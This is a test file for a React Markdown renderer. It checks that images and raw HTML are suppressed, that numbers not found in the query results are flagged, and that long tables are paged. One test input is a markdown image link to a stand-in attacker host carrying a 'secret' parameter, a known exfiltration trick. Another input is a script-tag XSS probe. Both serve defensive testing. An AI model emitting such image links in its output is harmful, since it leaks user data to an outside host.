import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { expect, it } from "vitest";
import { Markdown } from "./Markdown";

const render = (text: string, results: unknown[] = [], userText = "") => renderToStaticMarkup(createElement(Markdown, { text, results, userText }));

it("never renders an image, so no request carries data out", () => {
  const html = render("![t](https://evil.example/p.png?q=secret) hi");
  expect(html).not.toContain("<img");
  expect(html).not.toContain("evil.example");
});

it("renders markdown, drops raw html, and opens links safely", () => {
  const html = render("**Bold** and [x](https://a.example)\n\n- one\n- two\n\n<script>alert(1)</script>");
  expect(html).toContain("<strong>Bold</strong>");
  expect(html).toContain("<li>one</li>");
  expect(html).toContain('rel="noopener noreferrer"');
  expect(html).not.toContain("<script");
});

it("flags a number absent from the results, but reads **3.2** billion as one number", () => {
  const results = [{ rows: [[3.2e9]] }];
  expect(render("Total is **3.2** billion.", results)).not.toContain("<mark");
  expect(render("Total is **3.7** billion.", results)).toContain("<mark");
  expect(render("It is 47.5 percent", results)).toContain("<mark");
});

it("pages a Markdown table at 5 rows and keeps all of them reachable", () => {
  const rows = Array.from({ length: 12 }, (_, i) => `| r${i} | ${i} |`).join("\n");
  const html = render(`| name | n |\n|---|---|\n${rows}`);
  expect(html).toContain("r0");
  expect(html).toContain("r4");
  expect(html).not.toContain("r5<");
  expect(html).toContain("1–5 of 12");
  const small = render("| a | b |\n|---|---|\n| x | y |");
  expect(small).toContain("x");
  expect(small).not.toContain(" of ");
});
